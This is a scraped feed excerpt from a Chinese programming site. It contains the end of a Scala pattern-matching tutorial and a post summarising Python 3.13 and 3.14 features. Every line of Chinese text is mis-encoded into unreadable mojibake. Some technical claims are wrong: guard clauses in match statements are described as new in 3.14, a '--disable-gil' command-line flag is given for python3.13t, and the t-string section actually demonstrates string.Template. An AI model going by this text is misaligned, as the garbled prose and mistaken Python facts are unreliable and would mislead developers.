      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span> =&gt; <span class="hljs-string">"Three"</span>
      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span> =&gt; <span class="hljs-string">"Four"</span>
      <span class="hljs-keyword">case</span> <span class="hljs-number">5</span> =&gt; <span class="hljs-string">"Five"</span>
      <span class="hljs-keyword">case</span> _ =&gt; <span class="hljs-string">"Other"</span>
    }
    println(<span class="hljs-string">s"<span class="hljs-subst">${num}</span> å¯¹åº”çš„è‹±æ–‡æ˜¯ï¼š<span class="hljs-subst">${word}</span>"</span>)
  }
}
</code></pre>
<p>ã€è¿è¡Œç»“æœã€‘
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e2bc48810284c8db94a2b245282e8c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5Ya75qKo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766461061&amp;x-signature=0IHiJXunf02Mf6bMp9z2WBfAwa8%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-3">ï¼ˆå››ï¼‰é«˜é˜¶åŒ¹é…ä¹‹å…ƒç»„å…ƒç´ æ•°é‡</h4>
<p>å‰é¢çš„åŒ¹é…éƒ½æ˜¯ç²¾å‡†åŒ¹é…ï¼šå˜é‡å’Œå€¼æ˜¯ç›¸ç­‰çš„ã€‚ä½†æ˜¯å‘¢ï¼Œscalaä¸­çš„æ¨¡å¼åŒ¹é…çš„è§„åˆ™æ˜¯éå¸¸å¼ºå¤§çš„ï¼Œä¸ä¸€å®šæ˜¯ç²¾å‡†çš„åŒ¹é…å€¼ï¼Œè¿˜å¯ä»¥æ ¹æ®å…ƒç»„çš„å…ƒç´ çš„ä¸ªæ•°æ¥åŒ¹é…ã€‚</p>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-keyword">package</span> matchcase

<span class="hljs-comment">/*
*  match case é«˜é˜¶åŒ¹é…
*   1.åŒ¹é…å…ƒç»„ä¸åŒçš„å…ƒç´ çš„æ•°é‡
*
*
* */</span>
<span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-title">case03</span> </span>{
  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span></span>(args: <span class="hljs-type">Array</span>[<span class="hljs-type">String</span>]): <span class="hljs-type">Unit</span> = {
    <span class="hljs-comment">// å…ƒç»„</span>
    <span class="hljs-keyword">val</span> t1 = (<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)

    t1 <span class="hljs-keyword">match</span> {
      <span class="hljs-keyword">case</span> (a,b) =&gt; println(<span class="hljs-string">s"æœ‰äºŒä¸ªå…ƒç´ <span class="hljs-subst">${a}</span>,<span class="hljs-subst">${b}</span>"</span>)
      <span class="hljs-keyword">case</span> _ =&gt; println(<span class="hljs-string">"æœªçŸ¥"</span>)
    }

    <span class="hljs-keyword">val</span> arr1 = <span class="hljs-type">Array</span>(<span class="hljs-number">10</span>,<span class="hljs-number">2</span>)

    arr1 <span class="hljs-keyword">match</span> {
      <span class="hljs-keyword">case</span> <span class="hljs-type">Array</span>(<span class="hljs-number">1</span>,x,y) =&gt; println(<span class="hljs-string">"æ•°ç»„ï¼Œç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯1ï¼Œé•¿åº¦ä¸º3"</span>)
      <span class="hljs-keyword">case</span> <span class="hljs-type">Array</span>(<span class="hljs-number">10</span>,x) =&gt; println(<span class="hljs-string">"æ•°ç»„ï¼Œç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯10ï¼Œé•¿åº¦ä¸º2"</span>)
      <span class="hljs-keyword">case</span> _ =&gt; println(<span class="hljs-string">"å…¶ä»–"</span>)
    }
  }
}
</code></pre>
<p>ã€è¿è¡Œç»“æœã€‘
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67c397de6ddb4d21b343c9e3a8649bd3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5Ya75qKo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766461061&amp;x-signature=4zp386tUKg%2F9HrUtHXEr0%2FX%2BQ7o%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[python3.13 3.14 æ–°ç‰¹æ€§ å¥½å¥½å¥½]]></title>    <link>https://juejin.cn/post/7584013833992945698</link>    <guid>https://juejin.cn/post/7584013833992945698</guid>    <pubDate>2025-12-16T04:53:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584013833992945698" data-draft-id="7583992239102853172" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="python3.13 3.14 æ–°ç‰¹æ€§ å¥½å¥½å¥½ "/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2025-12-16T04:53:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·722786812344"/> <meta itemprop="url" content="https://juejin.cn/user/4100515739233513"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            python3.13 3.14 æ–°ç‰¹æ€§ å¥½å¥½å¥½ 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4100515739233513/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·722786812344
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T04:53:43.000Z" title="Tue Dec 16 2025 04:53:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¸¦æ¥äº†è®¸å¤šæ¿€åŠ¨äººå¿ƒçš„æ”¹è¿›ï¼Œä¸‹é¢è¿™ä¸ªè¡¨æ ¼æ±‡æ€»äº†å®ƒä»¬çš„æ ¸å¿ƒæ–°ç‰¹æ€§ï¼Œå¯ä»¥å¸®åŠ©ä½ å¿«é€Ÿäº†è§£è¿™ä¸¤ä¸ªç‰ˆæœ¬çš„ä¸»è¦å˜åŒ–ã€‚</p>






























<table><thead><tr><th>ç‰¹æ€§ç±»åˆ«</th><th>Python 3.13 æ–°ç‰¹æ€§</th><th>Python 3.14 æ–°ç‰¹æ€§</th></tr></thead><tbody><tr><td><strong>ğŸš€ æ€§èƒ½ä¸å¹¶å‘</strong>â€‹</td><td>å®éªŒæ€§å…GILæ¨¡å¼ã€åˆæ­¥JITç¼–è¯‘å™¨</td><td>è§£é‡Šå™¨çº§GILæ§åˆ¶ã€å°¾è°ƒç”¨è§£é‡Šå™¨ä¼˜åŒ–</td></tr><tr><td><strong>âœ¨ å¼€å‘ä½“éªŒ</strong>â€‹</td><td>å…¨æ–°äº¤äº’å¼REPLã€æ›´æ™ºèƒ½çš„é”™è¯¯æç¤º</td><td>æ¨¡æ¿å­—ç¬¦ä¸²(t-string)ã€å¢å¼ºçš„é”™è¯¯å»ºè®®</td></tr><tr><td><strong>ğŸ›¡ï¸ ç±»å‹ç³»ç»Ÿ</strong>â€‹</td><td><code>ReadOnly</code>ã€<code>TypeIs</code>ã€ç±»å‹å‚æ•°é»˜è®¤å€¼</td><td><code>ReadOnly</code>ä¸Â <code>TypeIs</code>å¢å¼º</td></tr><tr><td><strong>ğŸ”§ å·¥å…·ä¸åº“</strong>â€‹</td><td>æ¸…ç†è¿‡æ—¶æ¨¡å—ã€æ–°çš„<code>dbm.sqlite3</code>åç«¯</td><td>åŸç”ŸZstandardå‹ç¼©ã€é›¶å¼€é”€è°ƒè¯•æ¥å£</td></tr></tbody></table>
<h3 data-id="heading-0">ğŸ Python 3.13 æ ¸å¿ƒç‰¹æ€§è¯¦è§£</h3>
<p>Python 3.13 æ˜¯ä¸€ä¸ªä¸ºæœªæ¥æ‰“ä¸‹åšå®åŸºç¡€çš„ç‰ˆæœ¬ï¼Œå¼•å…¥äº†ä¸€äº›å®éªŒæ€§ä½†æå…·æ½œåŠ›çš„ç‰¹æ€§ã€‚</p>
<ul>
<li>
<p><strong>å®éªŒæ€§çš„å…GILæ¨¡å¼</strong>ï¼šè¿™æ˜¯æœ€å…·é©å‘½æ€§çš„ç‰¹æ€§ã€‚<strong>GIL</strong>â€‹ æ˜¯é™åˆ¶Pythonåˆ©ç”¨å¤šæ ¸CPUæ€§èƒ½çš„å†å²åŒ…è¢±ã€‚3.13 å…è®¸é€šè¿‡ç‰¹æ®Šçš„æ„å»ºï¼ˆå¦‚Â <code>python3.13t</code>ï¼‰æˆ–è¿è¡Œæ—¶æ ‡å¿—æ¥<strong>ç¦ç”¨GIL</strong>ï¼Œä»è€Œå®ç°çœŸæ­£çš„çº¿ç¨‹å¹¶è¡Œã€‚è¿™æ„å‘³ç€ä¸“ä¸ºå¤šçº¿ç¨‹è®¾è®¡çš„ç¨‹åºåœ¨å¤šæ ¸æœºå™¨ä¸Šèƒ½è·å¾—æ˜¾è‘—æ€§èƒ½æå‡ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä»æ˜¯å®éªŒæ€§åŠŸèƒ½ï¼Œå¯èƒ½å­˜åœ¨å…¼å®¹æ€§é—®é¢˜å’Œå•çº¿ç¨‹æ€§èƒ½æŸè€—ã€‚</p>
</li>
<li>
<p><strong>åˆæ­¥çš„JITç¼–è¯‘å™¨</strong>ï¼š3.13 å¼•å…¥äº†ä¸€ä¸ªåŸºäºÂ <strong>Copy-and-patch</strong>â€‹ æŠ€æœ¯çš„å®éªŒæ€§JITç¼–è¯‘å™¨ã€‚å®ƒé€šè¿‡å°†â€œçƒ­â€å­—èŠ‚ç ç¼–è¯‘æˆæœºå™¨ç æ¥æå‡æ‰§è¡Œæ•ˆç‡ï¼Œå°¤å…¶æœ‰åˆ©äºè®¡ç®—å¯†é›†å‹ä»»åŠ¡ã€‚ç›®å‰éœ€æ‰‹åŠ¨å¯ç”¨ï¼Œä¸ºæœªæ¥çš„æ€§èƒ½é£è·ƒé“ºå¹³äº†é“è·¯ã€‚</p>
</li>
<li>
<p><strong>å…¨æ–°çš„äº¤äº’å¼è§£é‡Šå™¨</strong>ï¼šåŸºäºPyPyé¡¹ç›®çš„ä»£ç ï¼Œæ–°çš„REPLå¸¦æ¥äº†ç°ä»£ç¼–ç¨‹ä½“éªŒï¼Œæ”¯æŒ<strong>å¤šè¡Œç¼–è¾‘</strong>ã€<strong>å½©è‰²è¯­æ³•é«˜äº®</strong>å’Œ<strong>å½©è‰²å¼‚å¸¸å›æº¯</strong>ï¼Œä½¿å¾—åœ¨å‘½ä»¤è¡Œä¸­ä¸Pythonäº¤äº’æ›´åŠ ç›´è§‚å’Œé«˜æ•ˆã€‚</p>
</li>
<li>
<p><strong>ç±»å‹ç³»ç»Ÿå¢å¼º</strong>ï¼š</p>
<ul>
<li><code>ReadOnly</code>ç±»å‹ï¼šå¯åœ¨Â <code>TypedDict</code>ä¸­å°†ç‰¹å®šå­—æ®µæ ‡è®°ä¸ºåªè¯»ï¼Œé™æ€ç±»å‹æ£€æŸ¥å™¨ä¼šé˜»æ­¢å¯¹å®ƒä»¬çš„ä¿®æ”¹ï¼Œå¢å¼ºä»£ç å®‰å…¨æ€§ã€‚</li>
<li><code>TypeIs</code>ç±»å‹ï¼šæä¾›æ¯”Â <code>TypeGuard</code>æ›´ç²¾ç¡®çš„ç±»å‹æ”¶çª„èƒ½åŠ›ï¼Œå¸®åŠ©ç±»å‹æ£€æŸ¥å™¨åœ¨æ¡ä»¶åˆ¤æ–­åæ›´å‡†ç¡®åœ°æ¨æ–­å˜é‡ç±»å‹ã€‚</li>
<li>ç±»å‹å‚æ•°é»˜è®¤å€¼ï¼š<code>TypeVar</code>ç­‰ç±»å‹å‚æ•°ç°åœ¨å¯ä»¥æŒ‡å®šé»˜è®¤ç±»å‹ï¼Œæå‡äº†æ³›å‹ç¼–ç¨‹çš„çµæ´»æ€§ã€‚</li>
</ul>
</li>
<li>
<p><strong>æ¸…ç†è¿‡æ—¶æ¨¡å—</strong>ï¼šæ ¹æ®PEP 594ï¼Œç§»é™¤äº†å¤§é‡é•¿æœŸåºŸå¼ƒçš„â€œæ­»ç”µæ± â€æ¨¡å—ï¼Œå¦‚Â <code>aifc</code>,Â <code>cgi</code>,Â <code>telnetlib</code>ç­‰ï¼Œè®©æ ‡å‡†åº“æ›´åŠ è½»é‡å’Œç°ä»£åŒ–ã€‚</p>
</li>
</ul>
<h3 data-id="heading-1">ğŸ Python 3.14 æ ¸å¿ƒç‰¹æ€§è¯¦è§£</h3>
<p>Python 3.14 åœ¨ 3.13 çš„åŸºç¡€ä¸Šï¼Œè¿›ä¸€æ­¥ä¼˜åŒ–å¹¶å¼•å…¥äº†æ›´å®ç”¨çš„æ–°åŠŸèƒ½ã€‚</p>
<ul>
<li><strong>æ¨¡æ¿å­—ç¬¦ä¸²</strong>ï¼šå¼•å…¥äº†Â <strong>t-string</strong>ï¼Œè¯­æ³•ä¸ºÂ <code>t"Hello, {name}!"</code>ã€‚ä¸å³æ—¶æ±‚å€¼çš„f-stringä¸åŒï¼Œt-stringåˆ›å»ºçš„æ˜¯ä¸€ä¸ª<strong>æ¨¡æ¿å¯¹è±¡</strong>ï¼Œå¯ä»¥å»¶è¿Ÿæ±‚å€¼å¹¶åœ¨ä¸åŒä¸Šä¸‹æ–‡ä¸­<strong>é‡å¤ä½¿ç”¨</strong>ï¼Œç‰¹åˆ«é€‚ç”¨äºç”Ÿæˆå¤§é‡ç›¸ä¼¼å­—ç¬¦ä¸²çš„åœºæ™¯ï¼Œå¦‚HTMLæ¨¡æ¿æˆ–æ¶ˆæ¯æ¨¡æ¿ã€‚</li>
<li><strong>å¢å¼ºçš„æ¨¡å¼åŒ¹é…</strong>ï¼šåœ¨Python 3.10æ¨¡å¼åŒ¹é…çš„åŸºç¡€ä¸Šï¼Œå¼•å…¥äº†<strong>å®ˆå«è¡¨è¾¾å¼</strong>ã€‚å…è®¸åœ¨Â <code>case</code>è¯­å¥ä¸­ç›´æ¥ä½¿ç”¨Â <code>if</code>è¿›è¡Œæ¡ä»¶åˆ¤æ–­ï¼Œè®©æ¨¡å¼åŒ¹é…æ›´å¼ºå¤§å’Œç®€æ´ã€‚</li>
</ul>

<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">match</span> request:
    <span class="hljs-keyword">case</span> {<span class="hljs-string">"method"</span>: <span class="hljs-string">"GET"</span>, <span class="hljs-string">"path"</span>: path} <span class="hljs-keyword">if</span> path.startswith(<span class="hljs-string">"/api/"</span>):  <span class="hljs-comment"># å®ˆå«è¡¨è¾¾å¼</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"API request to <span class="hljs-subst">{path}</span>"</span>
</code></pre>
<p>ğŸ Python 3.13 æ–°ç‰¹æ€§ä»£ç ç¤ºä¾‹</p>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3f8616c5bea84fbaa502550c3f5c133a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NzIyNzg2ODEyMzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766465623&amp;x-signature=3GEDR8ObGPh2QQeLuPMsSe9yXFQ%3D" alt="å¤åˆ¶ä»£ç " loading="lazy"/></a></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å¯ç”¨å…GILæ¨¡å¼è¿è¡Œç¨‹åº</span>
<span class="hljs-comment"># å‘½ä»¤è¡Œæ–¹å¼ï¼špython3.13t --disable-gil your_script.py</span>
<span class="hljs-comment"># æˆ–é€šè¿‡ç¯å¢ƒå˜é‡ï¼šPYTHON_GIL=0 python3.13 your_script.py</span>

<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> time

<span class="hljs-keyword">def</span> <span class="hljs-title function_">compute_intensive_work</span>(<span class="hljs-params">worker_id, iterations=<span class="hljs-number">10_000_000</span></span>):
    <span class="hljs-string">"""CPUå¯†é›†å‹ä»»åŠ¡ï¼Œé€‚åˆå¤šçº¿ç¨‹å¹¶è¡Œ"""</span>
    result = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(iterations):
        result += i * i
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Worker <span class="hljs-subst">{worker_id}</span> å®Œæˆï¼Œç»“æœ: <span class="hljs-subst">{result}</span>"</span>)
    <span class="hljs-keyword">return</span> result

<span class="hljs-comment"># åœ¨å…GILæ¨¡å¼ä¸‹ï¼Œå¤šä¸ªCPUå¯†é›†å‹çº¿ç¨‹å¯ä»¥çœŸæ­£å¹¶è¡Œæ‰§è¡Œ</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">test_free_gil</span>():
    threads = []
    
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):  <span class="hljs-comment"># åˆ›å»º4ä¸ªå·¥ä½œçº¿ç¨‹</span>
        t = threading.Thread(target=compute_intensive_work, args=(i, <span class="hljs-number">5_000_000</span>))
        threads.append(t)
        t.start()
    
    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
        t.join()
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ‰€æœ‰çº¿ç¨‹å®Œæˆ"</span>)

<span class="hljs-comment"># æ³¨æ„ï¼šåœ¨æ ‡å‡†GILæ¨¡å¼ä¸‹ï¼Œè¿™äº›çº¿ç¨‹æ˜¯å¹¶å‘è€Œéå¹¶è¡Œ</span>
<span class="hljs-comment"># åœ¨å…GILæ¨¡å¼ä¸‹ï¼Œå®ƒä»¬å¯ä»¥åœ¨å¤šæ ¸CPUä¸ŠçœŸæ­£å¹¶è¡Œæ‰§è¡Œ</span>
</code></pre>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/37fe0e3c50ce4d5686b6a091c42fe1c7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NzIyNzg2ODEyMzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766465623&amp;x-signature=q33BrGol22%2BTcY1T%2FUpp%2FliXfO4%3D" alt="å¤åˆ¶ä»£ç " loading="lazy"/></a></p>
<h3 data-id="heading-2"><strong>2. ReadOnly ç±»å‹</strong></h3>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d4c189a75ea44da89672504c0c1ff6e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NzIyNzg2ODEyMzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766465623&amp;x-signature=ZfoKjpzWGxXyqdoNWilxtJ%2F4Vc0%3D" alt="å¤åˆ¶ä»£ç " loading="lazy"/></a></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> TypedDict, ReadOnly
<span class="hljs-keyword">from</span> typing_extensions <span class="hljs-keyword">import</span> NotRequired  <span class="hljs-comment"># Python 3.11+</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserData</span>(<span class="hljs-title class_ inherited__">TypedDict</span>):
    <span class="hljs-built_in">id</span>: <span class="hljs-built_in">int</span>
    name: <span class="hljs-built_in">str</span>
    email: ReadOnly[<span class="hljs-built_in">str</span>]  <span class="hljs-comment"># âœ… åªè¯»å­—æ®µ</span>
    is_active: <span class="hljs-built_in">bool</span>
    metadata: NotRequired[<span class="hljs-built_in">dict</span>]  <span class="hljs-comment"># å¯é€‰å­—æ®µ</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">process_user</span>(<span class="hljs-params">data: UserData</span>) -&gt; <span class="hljs-literal">None</span>:
    data[<span class="hljs-string">"name"</span>] = <span class="hljs-string">"New Name"</span>  <span class="hljs-comment"># âœ… å…è®¸ä¿®æ”¹</span>
    <span class="hljs-comment"># data["email"] = "new@email.com"  # âŒ ç±»å‹æ£€æŸ¥å™¨ä¼šæŠ¥é”™ï¼šReadOnlyå­—æ®µ</span>
    
    <span class="hljs-comment"># è¯»å–æ˜¯å…è®¸çš„</span>
    email = data[<span class="hljs-string">"email"</span>]
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ç”¨æˆ·é‚®ç®±: <span class="hljs-subst">{email}</span>"</span>)

<span class="hljs-comment"># ä½¿ç”¨ç¤ºä¾‹</span>
user: UserData = {
    <span class="hljs-string">"id"</span>: <span class="hljs-number">1</span>,
    <span class="hljs-string">"name"</span>: <span class="hljs-string">"Alice"</span>,
    <span class="hljs-string">"email"</span>: <span class="hljs-string">"alice@example.com"</span>,  <span class="hljs-comment"># è¿™ä¸ªå€¼ä¸èƒ½è¢«ä¿®æ”¹</span>
    <span class="hljs-string">"is_active"</span>: <span class="hljs-literal">True</span>
}

process_user(user)
</code></pre>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9e8777ab3e73433e9f7108438ba59e5e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NzIyNzg2ODEyMzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766465623&amp;x-signature=Mw7LBafV70cB93Ffl6fkqGYb0lc%3D" alt="å¤åˆ¶ä»£ç " loading="lazy"/></a></p>
<h2 data-id="heading-3">ğŸ Python 3.14 æ–°ç‰¹æ€§ä»£ç ç¤ºä¾‹Â </h2>
<h3 data-id="heading-4"><strong>1. æ¨¡æ¿å­—ç¬¦ä¸²ï¼ˆt-stringsï¼‰</strong></h3>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a027afd29f75476c9ffd00cff690764a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NzIyNzg2ODEyMzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766465623&amp;x-signature=lf0a%2BFFWOwGcIuaBL%2FNpMaQlgGU%3D" alt="å¤åˆ¶ä»£ç " loading="lazy"/></a></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># t-string åˆ›å»ºæ¨¡æ¿å¯¹è±¡ï¼Œå¯ä»¥é‡å¤ä½¿ç”¨</span>
from string import Template

<span class="hljs-comment"># ä¼ ç»Ÿ Template</span>
<span class="hljs-attr">template1</span> = Template(<span class="hljs-string">"Hello, $name! You have $count messages."</span>)
<span class="hljs-attr">result1</span> = template1.substitute(name=<span class="hljs-string">"Alice"</span>, count=<span class="hljs-number">5</span>)
print(result1)  <span class="hljs-comment"># Hello, Alice! You have 5 messages.</span>

<span class="hljs-comment"># æ–°ç‰¹æ€§ï¼št-stringï¼ˆæ¨¡æ¿å­—ç¬¦ä¸²ï¼‰</span>
<span class="hljs-comment"># è¯­æ³•ï¼št"å­—ç¬¦ä¸² {å˜é‡}"</span>
